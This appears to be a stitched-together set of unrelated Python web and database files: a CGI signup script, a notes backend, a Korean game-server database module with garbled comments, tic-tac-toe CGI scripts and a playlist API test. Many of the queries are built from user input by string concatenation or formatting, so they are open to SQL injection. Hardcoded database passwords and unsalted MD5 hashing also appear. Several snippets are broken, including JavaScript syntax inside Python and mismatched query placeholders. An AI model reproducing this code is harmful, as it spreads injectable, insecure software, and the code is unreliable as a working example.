                    alert("Make sure you don't already have an account\nand that your passwords match.");
                </script>
                <meta http-equiv="refresh" content="0;url='signup.html'"/>
            </head>
        </html>
        ''')

    else:
	#hash the password before adding to the database
	hashedPassword = hashlib.md5(password.encode())
        #add the user to the database
        cursor.execute("INSERT INTO Users VALUES ("+username+","+ name+","+ hashedPassword")")

        #redirects to the message board
        print("Content-Type: text/html")
        print()
        print('''\
        <html>
            <head>
                <script>
                    alert("You are now signed in as "+username);
                </script>
                <meta http-equiv="refresh" content="0;url='messageboard.py'"/>
            </head>
        </html>
        ''')

else:
    #redirects to signup because they didn't do so correctly.
    print("Content-Type: text/html")
    print()
    print('''\
    <html>
        <head>
            <script>
                alert("You are failed to signup correctly.");
                alert("Make sure you don't already have an account\nand that your passwords match.");
            </script>
            <meta http-equiv="refresh" content="0;url='signup.html'"/>
        </head>
    </html>
    ''')

#necessary for the database to not get messed up
cursor.close()
conn.commit()
conn.close()

#!/usr/bin/env python3
import re
import cgi
import cgitb
from http import cookies
import urllib.parse
import mysql.connector
from mysql.connector import errorcode
import hashlib

cgitb.enable() #provides additional security by not revealing innerworkings of code to the outside

form = cgi.FieldStorage() #instantiates the form data

name = form.getvalue('name')
username = form.getvalue('username')
password = form.getvalue('password')
password2 = form.getvalue('password2')


userExists = false

if password == password2 && len(name)>0 && len(username)>0:
    #set cookies
    #set expiration time
    expires = 60*60;

    cookie = cookies.SimpleCookie()
    cookie["sessionID"] = urllib.parse.quote(Math.random())
    cookie["username"] = urllib.parse.quote(username)
    cookie["username"]['expires'] = expires

    #connect to mysql database
    conn = mysql.connector.connect(user='m201842', password = 'Bandit', host='midn.cyber.usna.edu', database='m201842')
    cursor = conn.cursor()
    cursor.execute("SELECT Username FROM Users")
    for row in cursor:
        if row == username:
            userExists = true
            break
    if userExists:
        #redirects to signup because they didn't do so correctly.
        print("Content-Type: text/html")
        print()
        print('''\
        <html>
            <head>
                <script>
                    alert("You are failed to signup correctly.");
                    alert("Make sure you don't already have an account\nand that your passwords match.");
                </script>
                <meta http-equiv="refresh" content="0;url='signup.html'"/>
            </head>
        </html>
        ''')

    else:
	#hash the password before adding to the database
	hashedPassword = hashlib.md5(password.encode())
	#Escape any < or > in the username or name
        username = re.escape(username)
	name = re.escape(name)	
        #add the user to the database
        cursor.execute("INSERT INTO Users VALUES ("+username+","+ name+","+ hashedPassword")")                    

        #redirects to the message board
        print("Content-Type: text/html")
        print()
        print('''\
        <html>
            <head>
                <script>
                    alert("You are now signed in as "+username);
                </script>
                <meta http-equiv="refresh" content="0;url='messageboard.py'"/>
            </head>
        </html>
        ''')

else:
    #redirects to signup because they didn't do so correctly.
    print("Content-Type: text/html")
    print()
    print('''\
    <html>
        <head>
            <script>
                alert("You are failed to signup correctly.");
                alert("Make sure you don't already have an account\nand that your passwords match.");
            </script>
            <meta http-equiv="refresh" content="0;url='signup.html'"/>
        </head>
    </html>
    ''')

#necessary for the database to not get messed up
cursor.close()
conn.commit()
conn.close()

import sqlite3, hashlib, random, string, uuid
SALT_LENGTH = 32
DATABASE_PATH = 'db/data.db'

def add_user(username, password):
    salt = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(SALT_LENGTH))
    password_hash = multiple_hash_password(password, salt)
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()

    cursor.execute('''INSERT INTO UserData(username, password_hash, salt) 
                      VALUES (?, ?, ?)''', (username, password_hash, salt))

    connection.commit()
    connection.close()


def login(username, password):
    #todo zabezpieczyƒá username przed SQLinjection
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()

    cursor.execute('''SELECT user_id, password_hash, salt FROM UserData WHERE username = ?''', [username])
    data = cursor.fetchone()
    if not data:
        return None
    user_id = data[0]
    password_hash = data[1]
    salt = data[2]
    session_id = None

    if multiple_hash_password(password, salt) == password_hash:
        session_id = str(uuid.uuid4())
        cursor.execute('UPDATE UserData SET session_id = ? WHERE user_id = ?', (session_id, user_id))
        print('SID: '+session_id)
        connection.commit()

        cursor.execute('SELECT secure_name, uuid_filename FROM Notes WHERE user_id = ?', [user_id])
        notes = []                    
        rows = cursor.fetchall()
        for row in rows:
            notes.append({
                "file_id": row[1].split('.')[0],
                "name": row[0]
            })
    connection.close()

    return session_id, notes


def logout(session_id):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('UPDATE UserData SET session_id = NULL WHERE session_id = ?', [session_id])
    connection.commit()
    connection.close()


def check_session(session_id):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('SELECT * FROM UserData WHERE session_id = ?', [session_id])
    verified = cursor.fetchone()
    connection.close()
    return verified


def is_username_taken(username):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('SELECT * FROM UserData WHERE username = ?', [username])
    records = cursor.fetchone()
    connection.close()
    return records


def multiple_hash_password(password, salt):
    hash_value = password + salt
    for _ in range(1000):
        hash_value = hashlib.sha3_512((hash_value + password + salt).encode()).hexdigest()
    return hash_value


def is_note_uuid_taken(uuid):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('SELECT * FROM Notes WHERE uuid_filename = ?', [uuid])
    records = cursor.fetchone()
    connection.close()
    return records


def add_notes(secure_fname, file_id, username):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('''INSERT INTO Notes(secure_name, user_id, uuid_filename)
                        VALUES (?, 
                        (SELECT user_id FROM UserData WHERE username = ?),
                         ?)''', (secure_fname, username, file_id))
    connection.commit()
    connection.close()


def confirm_owner_of_file(file_id, session_id, username):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('''SELECT session_id, username FROM UserData WHERE user_id = 
                                (SELECT user_id FROM Notes WHERE uuid_filename = ?)''', [file_id])
    row = cursor.fetchone()
    connection.close()
    return row[0] == session_id and row[1] == username


def get_secure_filename(file_id):
    connection = sqlite3.connect(DATABASE_PATH)
    cursor = connection.cursor()
    cursor.execute('''SELECT secure_name FROM Notes WHERE uuid_filename = ?''', [file_id])
    row = cursor.fetchone()
    connection.close()
    return row[0]

#db_processor_mysql.py
import asyncio
import tormysql

_pool = None
_handler = None

def set_log_handler(handler):
    '''dbÍ¥ÄÎ†® ÏóêÎü¨Î©îÏãúÏßÄÎ•º Ï≤òÎ¶¨Ìï† Ìï∏Îì§Îü¨Î•º Îì±Î°ùÌïúÎã§.'''
    global _handler
    _handler = handler

def connect_db_server(host_addr, user_id, password, db, loop):
    '''db poolÏùÑ Ïó∞Îã§.'''
    global _pool
    _pool = tormysql.ConnectionPool(
        max_connections = 20,
        idle_seconds = 7200,
        wait_connection_timeout = 3,
        host = host_addr,
        user = user_id,
        passwd = password,
        db = db,
        charset = "utf8")

    return loop.run_until_complete(is_connect_db())

async def is_connect_db():
    try:
        async with await _pool.Connection():
            pass
    except Exception as ex:
        _error_report(ex)
        return False

    return True

async def create_account(name: str, password: str):
    '''dbÏóê Í≥ÑÏ†ïÏùÑ ÏÉùÏÑ±ÌïúÎã§.'''
    global _pool
    uid = -1
    async with await _pool.Connection() as conn:
        try:
            async with conn.cursor() as cursor:
                await cursor.execute(\                    
                    "INSERT INTO player (name, password, lv, xp, hp) values ('%s', '%s', 1, 0, 150)"\                    
                    % (name, password))                    
                uid = conn.insert_id()
        except Exception as ex:
            await conn.rollback()
            _error_report(ex)
            return False, -1  
        await conn.commit()

    return True, uid

async def get_player_info(name: str) -> tuple:
    '''dbÏóêÏÑú ÌîåÎ†àÏù¥Ïñ¥ Ï†ïÎ≥¥Î•º ÏñªÏñ¥Ïò®Îã§.'''
    global _pool
    async with await _pool.Connection() as conn:
        try:
            async with conn.cursor() as cursor:
                await cursor.execute("SELECT uid, name, password, lv, xp, hp FROM player where name = '%s'" % name)                    
                data = cursor.fetchone()
        except Exception as ex:
            _error_report(ex)
            return tuple()

    if data is None:
        return tuple()

    return data

async def update_level_and_xp(name: str, lv: int, xp: int):
    '''level, xp Ï†ïÎ≥¥Î•º ÏóÖÎç∞Ïù¥Ìä∏ ÌïúÎã§.'''
    global _pool
    async with await _pool.Connection() as conn:
        try:
            async with conn.cursor() as cursor:
                await cursor.execute("UPDATE player SET lv=%d, xp=%d where name = '%s'" % (lv, xp, name))
        except Exception as ex:
            _error_report(ex)
            return False
        await conn.commit() 

    return True

async def update_hp(name: str, hp: int):
    '''hp Ï†ïÎ≥¥Î•º ÏóÖÎç∞Ïù¥Ìä∏ ÌïúÎã§.'''
    global _pool
    async with await _pool.Connection() as conn:
        try:
            async with conn.cursor() as cursor:
                await cursor.execute("UPDATE player SET hp=%d where name = '%s'" % (hp, name))
        except Exception as ex:
            _error_report(ex)
            return False
        await conn.commit() 

    return True

async def create_item(player_uid:int, item_id: int):
    '''dbÏóê ÏïÑÏù¥ÌÖúÏùÑ Ï∂îÍ∞ÄÌïúÎã§.'''
    global _pool
    uid = -1
    async with await _pool.Connection() as conn:
        try:
            async with conn.cursor() as cursor:
                await cursor.execute("INSERT INTO item (player_uid, item_id)\
                 values (%d, %d)" % (player_uid, item_id))
            uid = conn.insert_id()
        except Exception as ex:
            _error_report(ex)
            return False, -1
        await conn.commit()

    return True, uid

async def get_item_list(player_uid: int):
    '''dbÏóêÏÑú ÌäπÏ†ï ÌîåÎ†àÏù¥Ïñ¥Ïùò ÏÜåÏú† ÏïÑÏù¥ÌÖú Î¶¨Ïä§Ìä∏Î•º ÏñªÏñ¥Ïò®Îã§.'''
    global _pool
    async with await _pool.Connection() as conn:
        try:
            async with conn.cursor() as cursor:
                await cursor.execute("SELECT uid, item_id FROM item where player_uid = %d" % player_uid)
                datas = cursor.fetchall()
        except Exception as ex:
            _error_report(ex)
            return tuple(), False

    return datas, True

def close():
    '''db poolÏùÑ Ï¢ÖÎ£åÌïúÎã§.'''
    global _pool
    if _pool is not None:
        _pool.close()
        _pool = None

def _error_report(err_msg):
    '''ÏóêÎü¨ Ìï∏Îì§Îü¨Î°ú ÏóêÎü¨Î©îÏãúÏßÄÎ•º ÎçòÏßÑÎã§.'''
    global _handler
    if _handler:
        _handler(err_msg)

if __name__ == '__main__':
    def error_handler(msg):
        print(msg)

    loop = asyncio.get_event_loop()
    set_log_handler(error_handler)
    result = connect_db_server('127.0.0.1', 'root', 'Mysql12345', 'mud_db', loop)
    print('db connect result is ' + str(result))
    loop.run_until_complete(create_item(37, 0))                    
    close()



# NOTE: I did *NOT* add a shebang here, intentionally, because
#       this is *NEVER* supposed to be a user-facing script!



class FormError(BaseException):
    def __init__(this, msg):
        this.msg = msg



def get_game_info(conn, game):
    # get the basic game properties
    cursor = conn.cursor()
    cursor.execute("SELECT player1,player2,size,state FROM games WHERE id = %d;" % game)                    
    if cursor.rowcount != 1:
        raise FormError("Invalid game ID")

    row = cursor.fetchall()[0]
    players = [row[0],row[1]]
    size    =  row[2]
    state   =  row[3]

    if state is None:
         state = "Active"

    cursor.close()

    return (players,size,state)



def build_board(conn, game,size):
    # we'll build the empty board, and then fill in with the move list that
    # we get from the DB.
    board = []
    for i in range(size):
        board.append([""]*size)


    # search for all moves that have happenend during this game.
    cursor = conn.cursor()
    cursor.execute("SELECT x,y,letter FROM moves WHERE gameID = %d;" % game)                    

    counts = {"X":0, "O":0}
    for move in cursor.fetchall():
        (x,y,letter) = move

        x = int(x)
        y = int(y)
        assert x >= 0 and x < size
        assert y >= 0 and y < size

        assert letter in "XO"

        assert board[x][y] == ""
        board[x][y] = letter

        counts[letter] += 1

    cursor.close()

    assert counts["X"] >= counts["O"]
    assert counts["X"] <= counts["O"]+1

    if counts["X"] == counts["O"]:
        nextPlayer = 0
    else:
        nextPlayer = 1
    letter = "XO"[nextPlayer]

    return (board,nextPlayer,letter)


#! /usr/bin/env python3

# taken from:
#    https://docs.python.org/3.4/howto/webservers.html

import cgi

# enable debugging.  Note that the Python docs recommend this for testing, but
# say that it's a very bad idea to leave enabled in production, as it can leak
# information about your internal implementation.
import cgitb
cgitb.enable(display=0, logdir="/var/log/httpd/cgi_err/")


import MySQLdb
import private_no_share_dangerous_passwords as pnsdp

from common import FormError



# this function handles the processing of the actual text of the HTML file.
# It writes everything from the HTML header, to the content in the body, to
# the closing tags at the bottom.
#
# Later, I ought to make this smarter, to handle cookies and such.  Or, just
# switch over to some framework which makes it all easier for me!

def process_form():
    # see https://docs.python.org/3.4/library/cgi.html for the basic usage
    # here.
    form = cgi.FieldStorage()


    if "player1" not in form or "player2" not in form or "size" not in form:
        raise FormError("Invalid parameters.")

    player1 = form["player1"].value
    player2 = form["player2"].value
    for c in player1+player2:
        if c not in "_-" and not c.isdigit() and not c.isalpha():
            raise FormError("Invalid parameters: The player names can only contains upper and lowercase characters, digits, underscores, and hypens")
            return

    try:
        size = int(form["size"].value)
    except:
        raise FormError("Invalid parameters: 'size' is not an integer.")
        return

    if size < 2 or size > 9:
        raise FormError("The 'size' must be in the range 2-9, inclusive.")


    # connect to the database
    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,
                           user   = pnsdp.SQL_USER,
                           passwd = pnsdp.SQL_PASSWD,
                           db     = pnsdp.SQL_DB)
    cursor = conn.cursor()

    # insert the new row
    cursor.execute("""INSERT INTO games(player1,player2,size) VALUES("%s","%s",%d);""" % (player1,player2,size))                    

    gameID = cursor.lastrowid


    # MySQLdb has been building a transaction as we run.  Commit them now, and
    # also clean up the other resources we've allocated.
    conn.commit()
    cursor.close()
    conn.close()

    return gameID



# this is what actually runs, each time that we are called...

try:
    #print("Content-type: text/html")
    #print()

    # this will not print out *ANYTHING* !!!
    gameID = process_form()

    # https://en.wikipedia.org/wiki/Post/Redirect/Get
    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python
    print("Status: 303 See other")
    print("""Location: http://%s/cgi-bin/list.py?new_game=%s""" % (pnsdp.WEB_HOST,gameID))
    print()

except FormError as e:
    print("""Content-Type: text/html;charset=utf-8

<html>

<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>

<body>

<p>ERROR: %s

<p><a href="list.py">Return to game list</a>

</body>
</html>

""" % e.msg, end="")

except:
    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error



#! /usr/bin/env python3

# taken from:
#    https://docs.python.org/3.4/howto/webservers.html

import cgi

# enable debugging.  Note that the Python docs recommend this for testing, but
# say that it's a very bad idea to leave enabled in production, as it can leak
# information about your internal implementation.
import cgitb
cgitb.enable(display=0, logdir="/var/log/httpd/cgi_err/")

import MySQLdb
import private_no_share_dangerous_passwords as pnsdp

from common import get_game_info,build_board,FormError



# this function handles the processing of the actual text of the HTML file.
# It writes everything from the HTML header, to the content in the body, to
# the closing tags at the bottom.
#
# Later, I ought to make this smarter, to handle cookies and such.  Or, just
# switch over to some framework which makes it all easier for me!

def process_form():
    # see https://docs.python.org/3.4/library/cgi.html for the basic usage
    # here.
    form = cgi.FieldStorage()


    # connect to the database
    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,
                           user   = pnsdp.SQL_USER,
                           passwd = pnsdp.SQL_PASSWD,
                           db     = pnsdp.SQL_DB)


    if "user" not in form or "game" not in form:
        raise FormError("Invalid parameters.")
    if "pos" not in form and "resign" not in form:
        raise FormError("Invalid parameters.")

    game = int(form["game"].value)


    (players,size,state) = get_game_info(conn, game)

    user = form["user"].value
    if user not in players:
        raise FormError("Invalid player ID - player is not part of this game")


    if "resign" in form:
        resign = True
    else:
        resign = False
        pos = form["pos"].value.split(",")
        assert len(pos) == 2
        x = int(pos[0])
        y = int(pos[1])


    (board,nextPlayer,letter) = build_board(conn, game,size)

    if user != players[nextPlayer]:
        raise FormError("Internal error, incorrect player is attempting to move.")


    if resign:
        # this user is choosing to resign.  Update the game state to reflect that.
        other_player_name = players[1-nextPlayer]

        cursor = conn.cursor()
        cursor.execute("""UPDATE games SET state="%s:resignation" WHERE id=%d;""" % (other_player_name,game))                    
        cursor.close()

    else:
        assert x >= 0 and x < size
        assert y >= 0 and y < size

        assert board[x][y] == ""
        board[x][y] = "XO"[nextPlayer]

        # we've done all of our sanity checks.  We now know enough to say that
        # it's safe to add a new move.
        cursor = conn.cursor()
        cursor.execute("""INSERT INTO moves(gameID,x,y,letter,time) VALUES(%d,%d,%d,"%s",NOW());""" % (game,x,y,letter))                    

        if cursor.rowcount != 1:
            raise FormError("Could not make move, reason unknown.")

        cursor.close()

        result = analyze_board(board)
        if result != "":
            if result == "win":
                result = players[nextPlayer]+":win"

            cursor = conn.cursor()
            cursor.execute("""UPDATE games SET state="%s" WHERE id=%d;""" % (result,game))                    
            cursor.close()

    # we've made changes, make sure to commit them!
    conn.commit()
    conn.close()


    # return the parms to the caller, so that they can build a good redirect
    return (user,game)



def analyze_board(board):
    size = len(board)

    for x in range(size):
        # scan through the column 'x' to see if they are all the same.
        if board[x][0] == "":
            continue
        all_same = True
        for y in range(1,size):
            if board[x][y] != board[x][0]:
                all_same = False
                break
        if all_same:
            return "win"

    for y in range(size):
        # scan through the row 'y' to see if they are all the same.
        if board[0][y] == "":
            continue
        all_same = True
        for x in range(1,size):
            if board[x][y] != board[0][y]:
                all_same = False
                break
        if all_same:
            return "win"

    # check the NW/SE diagonal
    if board[0][0] != "":
        all_same = True
        for i in range(1,size):
            if board[i][i] != board[0][0]:
                all_same = False
                break
        if all_same:
            return "win"

    # check the NE/SW diagonal
    if board[size-1][0] != "":
        all_same = True
        for i in range(1,size):
            if board[size-1-i][i] != board[size-1][0]:
                all_same = False
                break
        if all_same:
            return "win"

    # check for stalemate
    for x in range(size):
        for y in range(size):
            if board[x][y] == "":
                return ""
    return "stalemate"



# this is what actually runs, each time that we are called...

try:
#    print("Content-type: text/html")
#    print()

    # this will not print out *ANYTHING* !!!
    (user,game) = process_form()

    # https://en.wikipedia.org/wiki/Post/Redirect/Get
    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python
    print("Status: 303 See other")
    print("""Location: http://%s/cgi-bin/game.py?user=%s&game=%s""" % (pnsdp.WEB_HOST, user,game))
    print()

except FormError as e:
    print("""Content-Type: text/html;charset=utf-8

<html>

<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>

<body>

<p>ERROR: %s

<p><a href="list.py">Return to game list</a>

</body>
</html>

""" % e.msg, end="")

except:
    print("""Content-Type: text/html;charset=utf-8\n\n""")

    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error



# NOTE: I did *NOT* add a shebang here, intentionally, because
#       this is *NEVER* supposed to be a user-facing script!



class FormError(BaseException):
    def __init__(this, msg):
        this.msg = msg



def get_game_info(conn, game):
    # get the basic game properties
    cursor = conn.cursor()
    cursor.execute("SELECT player1,player2,size,state FROM games WHERE id = %d;", (game,))                    
    if cursor.rowcount != 1:
        raise FormError("Invalid game ID")

    row = cursor.fetchall()[0]
    players = [row[0],row[1]]
    size    =  row[2]
    state   =  row[3]

    if state is None:
         state = "Active"

    cursor.close()

    return (players,size,state)



def build_board(conn, game,size):
    # we'll build the empty board, and then fill in with the move list that
    # we get from the DB.
    board = []
    for i in range(size):
        board.append([""]*size)


    # search for all moves that have happenend during this game.
    cursor = conn.cursor()
    cursor.execute("SELECT x,y,letter FROM moves WHERE gameID = %d;", (game,))                    

    counts = {"X":0, "O":0}
    for move in cursor.fetchall():
        (x,y,letter) = move

        x = int(x)
        y = int(y)
        assert x >= 0 and x < size
        assert y >= 0 and y < size

        assert letter in "XO"

        assert board[x][y] == ""
        board[x][y] = letter

        counts[letter] += 1

    cursor.close()

    assert counts["X"] >= counts["O"]
    assert counts["X"] <= counts["O"]+1

    if counts["X"] == counts["O"]:
        nextPlayer = 0
    else:
        nextPlayer = 1
    letter = "XO"[nextPlayer]

    return (board,nextPlayer,letter)


#! /usr/bin/env python3

# taken from:
#    https://docs.python.org/3.4/howto/webservers.html

import cgi

# enable debugging.  Note that the Python docs recommend this for testing, but
# say that it's a very bad idea to leave enabled in production, as it can leak
# information about your internal implementation.
import cgitb
cgitb.enable(display=0, logdir="/var/log/httpd/cgi_err/")


import MySQLdb
import private_no_share_dangerous_passwords as pnsdp

from common import FormError



# this function handles the processing of the actual text of the HTML file.
# It writes everything from the HTML header, to the content in the body, to
# the closing tags at the bottom.
#
# Later, I ought to make this smarter, to handle cookies and such.  Or, just
# switch over to some framework which makes it all easier for me!

def process_form():
    # see https://docs.python.org/3.4/library/cgi.html for the basic usage
    # here.
    form = cgi.FieldStorage()


    if "player1" not in form or "player2" not in form or "size" not in form:
        raise FormError("Invalid parameters.")

    player1 = form["player1"].value
    player2 = form["player2"].value
    for c in player1+player2:
        if c not in "_-" and not c.isdigit() and not c.isalpha():
            raise FormError("Invalid parameters: The player names can only contains upper and lowercase characters, digits, underscores, and hypens")
            return

    try:
        size = int(form["size"].value)
    except:
        raise FormError("Invalid parameters: 'size' is not an integer.")
        return

    if size < 2 or size > 9:
        raise FormError("The 'size' must be in the range 2-9, inclusive.")


    # connect to the database
    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,
                           user   = pnsdp.SQL_USER,
                           passwd = pnsdp.SQL_PASSWD,
                           db     = pnsdp.SQL_DB)
    cursor = conn.cursor()

    # insert the new row
    cursor.execute("""INSERT INTO games(player1,player2,size) VALUES("%s","%s",%d);""", (player1,player2,size))                    

    gameID = cursor.lastrowid


    # MySQLdb has been building a transaction as we run.  Commit them now, and
    # also clean up the other resources we've allocated.
    conn.commit()
    cursor.close()
    conn.close()

    return gameID



# this is what actually runs, each time that we are called...

try:
    #print("Content-type: text/html")
    #print()

    # this will not print out *ANYTHING* !!!
    gameID = process_form()

    # https://en.wikipedia.org/wiki/Post/Redirect/Get
    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python
    print("Status: 303 See other")
    print("""Location: http://%s/cgi-bin/list.py?new_game=%s""" % (pnsdp.WEB_HOST,gameID))
    print()

except FormError as e:
    print("""Content-Type: text/html;charset=utf-8

<html>

<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>

<body>

<p>ERROR: %s

<p><a href="list.py">Return to game list</a>

</body>
</html>

""" % e.msg, end="")

except:
    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error



#! /usr/bin/env python3

# taken from:
#    https://docs.python.org/3.4/howto/webservers.html

import cgi

# enable debugging.  Note that the Python docs recommend this for testing, but
# say that it's a very bad idea to leave enabled in production, as it can leak
# information about your internal implementation.
import cgitb
cgitb.enable(display=0, logdir="/var/log/httpd/cgi_err/")

import MySQLdb
import private_no_share_dangerous_passwords as pnsdp

from common import get_game_info,build_board,FormError



# this function handles the processing of the actual text of the HTML file.
# It writes everything from the HTML header, to the content in the body, to
# the closing tags at the bottom.
#
# Later, I ought to make this smarter, to handle cookies and such.  Or, just
# switch over to some framework which makes it all easier for me!

def process_form():
    # see https://docs.python.org/3.4/library/cgi.html for the basic usage
    # here.
    form = cgi.FieldStorage()


    # connect to the database
    conn = MySQLdb.connect(host   = pnsdp.SQL_HOST,
                           user   = pnsdp.SQL_USER,
                           passwd = pnsdp.SQL_PASSWD,
                           db     = pnsdp.SQL_DB)


    if "user" not in form or "game" not in form:
        raise FormError("Invalid parameters.")
    if "pos" not in form and "resign" not in form:
        raise FormError("Invalid parameters.")

    game = int(form["game"].value)


    (players,size,state) = get_game_info(conn, game)

    user = form["user"].value
    if user not in players:
        raise FormError("Invalid player ID - player is not part of this game")


    if "resign" in form:
        resign = True
    else:
        resign = False
        pos = form["pos"].value.split(",")
        assert len(pos) == 2
        x = int(pos[0])
        y = int(pos[1])


    (board,nextPlayer,letter) = build_board(conn, game,size)

    if user != players[nextPlayer]:
        raise FormError("Internal error, incorrect player is attempting to move.")


    if resign:
        # this user is choosing to resign.  Update the game state to reflect that.
        other_player_name = players[1-nextPlayer]

        cursor = conn.cursor()
        cursor.execute("""UPDATE games SET state="%s:resignation" WHERE id=%d;""", (other_player_name,game))                    
        cursor.close()

    else:
        assert x >= 0 and x < size
        assert y >= 0 and y < size

        assert board[x][y] == ""
        board[x][y] = "XO"[nextPlayer]

        # we've done all of our sanity checks.  We now know enough to say that
        # it's safe to add a new move.
        cursor = conn.cursor()
        cursor.execute("""INSERT INTO moves(gameID,x,y,letter,time) VALUES(%d,%d,%d,"%s",NOW());""", (game,x,y,letter))                    

        if cursor.rowcount != 1:
            raise FormError("Could not make move, reason unknown.")

        cursor.close()

        result = analyze_board(board)
        if result != "":
            if result == "win":
                result = players[nextPlayer]+":win"

            cursor = conn.cursor()
            cursor.execute("""UPDATE games SET state="%s" WHERE id=%d;""", (result,game))                    
            cursor.close()

    # we've made changes, make sure to commit them!
    conn.commit()
    conn.close()


    # return the parms to the caller, so that they can build a good redirect
    return (user,game)



def analyze_board(board):
    size = len(board)

    for x in range(size):
        # scan through the column 'x' to see if they are all the same.
        if board[x][0] == "":
            continue
        all_same = True
        for y in range(1,size):
            if board[x][y] != board[x][0]:
                all_same = False
                break
        if all_same:
            return "win"

    for y in range(size):
        # scan through the row 'y' to see if they are all the same.
        if board[0][y] == "":
            continue
        all_same = True
        for x in range(1,size):
            if board[x][y] != board[0][y]:
                all_same = False
                break
        if all_same:
            return "win"

    # check the NW/SE diagonal
    if board[0][0] != "":
        all_same = True
        for i in range(1,size):
            if board[i][i] != board[0][0]:
                all_same = False
                break
        if all_same:
            return "win"

    # check the NE/SW diagonal
    if board[size-1][0] != "":
        all_same = True
        for i in range(1,size):
            if board[size-1-i][i] != board[size-1][0]:
                all_same = False
                break
        if all_same:
            return "win"

    # check for stalemate
    for x in range(size):
        for y in range(size):
            if board[x][y] == "":
                return ""
    return "stalemate"



# this is what actually runs, each time that we are called...

try:
#    print("Content-type: text/html")
#    print()

    # this will not print out *ANYTHING* !!!
    (user,game) = process_form()

    # https://en.wikipedia.org/wiki/Post/Redirect/Get
    # https://stackoverflow.com/questions/6122957/webpage-redirect-to-the-main-page-with-cgi-python
    print("Status: 303 See other")
    print("""Location: http://%s/cgi-bin/game.py?user=%s&game=%s""" % (pnsdp.WEB_HOST, user,game))
    print()

except FormError as e:
    print("""Content-Type: text/html;charset=utf-8

<html>

<head><title>346 - Russ Lewis - Tic-Tac-Toe</title></head>

<body>

<p>ERROR: %s

<p><a href="list.py">Return to game list</a>

</body>
</html>

""" % e.msg, end="")

except:
    print("""Content-Type: text/html;charset=utf-8\n\n""")

    raise    # throw the error again, now that we've printed the lead text - and this will cause cgitb to report the error




import pytest
import bottle
import webtest
import MySQLdb
import os

from logging import getLogger
from bottle_mysql import Plugin

from video import video_api
from playlist import playlist_api

from database import populate_test_database

logger = getLogger()

app = bottle.default_app()
plugin = Plugin(dbuser=os.environ["USER"], dbpass=os.environ["PASSWORD"], dbname='test')
app.install(plugin)
test_app = webtest.TestApp(app)


def create_video(playlist_id, title, thumbnail, position):
    db = connect_to_database()
    cursor = db.cursor()
    cursor.execute(
        "INSERT INTO video (playlist_id, title, thumbnail, position) VALUES('{playlist_id}', '{title}', '{thumbnail}', '{position}');".format(                    
            playlist_id=playlist_id, title=title, thumbnail=thumbnail, position=position))                    
    db.commit()
    db.close()


def create_playlist(name):
    db = connect_to_database()
    cursor = db.cursor()
    cursor.execute(
        "INSERT INTO playlist (name, video_position) VALUES('{name}', 0);".format(name=name))                    
    db.commit()
    db.close()


def connect_to_database():
    db = MySQLdb.connect("localhost", "root", os.environ["PASSWORD"], 'test')
    return db


def test_should_return_all_playlists():
    populate_test_database()

    create_playlist('first playlist')
    create_playlist('second playlist')

    response = test_app.get('/playlists')
    assert response.json['status'] == 'OK'
    assert response.json['data'] == [dict(id=1, name='first playlist'),
                                     dict(id=2, name='second playlist')]


def test_should_return_a_playlist():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.get('/playlists/1')
    assert response.json['status'] == 'OK'
    assert response.json['data'] == dict(
        id=1, name='first playlist', video_position=0)


def test_should_create_a_playlist():
    populate_test_database()

    response = test_app.post('/playlists/nn')
    assert response.json['status'] == 'OK'

    response2 = test_app.get('/playlists')
    assert response2.json['status'] == 'OK'
    assert response2.json['data'] == [dict(id=1, name='nn')]


def test_should_update_a_playlist_name():
    populate_test_database()

    response = test_app.post('/playlists/nn')
    assert response.json['status'] == 'OK'

    response2 = test_app.put('/playlists/1/name')
    assert response2.json['status'] == 'OK'

    response3 = test_app.get('/playlists')
    assert response3.json['status'] == 'OK'
    assert response3.json['data'] == [dict(id=1, name='name')]


def test_should_delete_a_playlist_and_remove_all_its_videos():
    populate_test_database()

    create_playlist('first playlist')
    create_video(1, 'the title of the video',
                 'the url of the video', 1)
    create_video(1, 'the title of the video',
                 'the url of the video', 2)

    response = test_app.delete('/playlists/1')
    assert response.json['status'] == 'OK'

    response2 = test_app.get('/playlists/1')
    assert response2.json['status'] == 'OK'
    assert response2.json['data'] == None

    response3 = test_app.get('/videos/1')
    assert response3.json['status'] == 'OK'
    assert response3.json['data'] == []


def test_should_return_all_the_videos_from_a_playlist():
    populate_test_database()

    create_playlist('first playlist')
    create_video(1, 'the title of the video',
                 'the url of the video', 1)
    create_video(1, 'the title of the video',
                 'the url of the video', 2)

    response = test_app.get('/videos/1')
    assert response.json['status'] == 'OK'
    assert response.json['data'] == [dict(id=1, title='the title of the video',
                                          thumbnail='the url of the video', position=1),
                                     dict(id=2, title='the title of the video',
                                          thumbnail='the url of the video', position=2)]


def test_should_return_all_the_videos():
    populate_test_database()

    create_playlist('first playlist')
    create_playlist('second playlist')
    create_video(1, 'f title',
                 'f url', 1)
    create_video(1, 's title',
                 's url', 2)
    create_video(1, 't title',
                 't url', 3)
    create_video(2, 'f title',
                 'f url', 1)
    create_video(2, 'fh title',
                 'fh url', 2)

    response = test_app.get('/videos')
